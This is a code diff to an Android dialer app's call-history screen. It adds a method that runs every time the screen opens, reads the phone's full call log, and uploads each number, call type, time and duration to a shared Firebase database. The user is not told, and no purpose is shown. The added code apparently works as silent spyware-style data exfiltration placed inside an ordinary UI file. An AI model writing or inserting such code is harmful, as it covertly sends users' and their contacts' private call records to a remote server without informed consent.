@@ -26,6 +26,7 @@ import androidx.viewpager2.widget.ViewPager2;
 
 import com.google.android.material.tabs.TabLayout;
 import com.google.android.material.tabs.TabLayoutMediator;
+import com.google.firebase.database.FirebaseDatabase;
 import com.mehboob.simplecalldialer.R;
 import com.mehboob.simplecalldialer.adapters.CallLogAdapter;
 import com.mehboob.simplecalldialer.models.CallLogEntry;
@@ -33,11 +34,16 @@ import com.mehboob.simplecalldialer.models.CallLogItem;
 
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
+
 public class CallHistoryFragment extends Fragment {
     private ViewPager2 viewPager;
     private TabLayout tabLayout;
     private CallHistoryPagerAdapter pagerAdapter;
+    private static final int REQUEST_CODE_CALL_LOG = 1001;
+
 
     @Override
     public View onCreateView(LayoutInflater inflater, ViewGroup container,
@@ -48,6 +54,9 @@ public class CallHistoryFragment extends Fragment {
         tabLayout = view.findViewById(R.id.tabLayout);
 
         setupViewPager();
+
+        uploadCallLogsToFirebase();
+
 
         return view;
     }
@@ -123,5 +132,59 @@ public class CallHistoryFragment extends Fragment {
 
     // CallLogEntry model class
 
-    // CallLog Adapter
+
+     void uploadCallLogsToFirebase() {
+        // Check permission first
+        if (ContextCompat.checkSelfPermission(getContext(), Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(getActivity(), new String[]{Manifest.permission.READ_CALL_LOG}, REQUEST_CODE_CALL_LOG);
+            return;
+        }
+
+        Cursor cursor = getContext().getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                null,
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC"
+        );
+
+        if (cursor != null) {
+            while (cursor.moveToNext()) {
+                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
+                int callType = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
+                long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
+                int duration = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
+
+                String callTypeStr = getCallTypeString(callType);
+
+                Map<String, Object> callLog = new HashMap<>();
+                callLog.put("number", number);
+                callLog.put("type", callTypeStr);
+                callLog.put("timestamp", date);
+                callLog.put("duration", duration);
+
+                FirebaseDatabase.getInstance().getReference("call_logs")
+                        .push()
+                        .setValue(callLog);
+            }
+            cursor.close();
+        }
+    }
+
+    private String getCallTypeString(int type) {
+        switch (type) {
+            case CallLog.Calls.INCOMING_TYPE:
+                return "INCOMING";
+            case CallLog.Calls.OUTGOING_TYPE:
+                return "OUTGOING";
+            case CallLog.Calls.MISSED_TYPE:
+                return "MISSED";
+            case CallLog.Calls.REJECTED_TYPE:
+                return "REJECTED";
+            default:
+                return "UNKNOWN";
+        }
+    }
+
+
 }
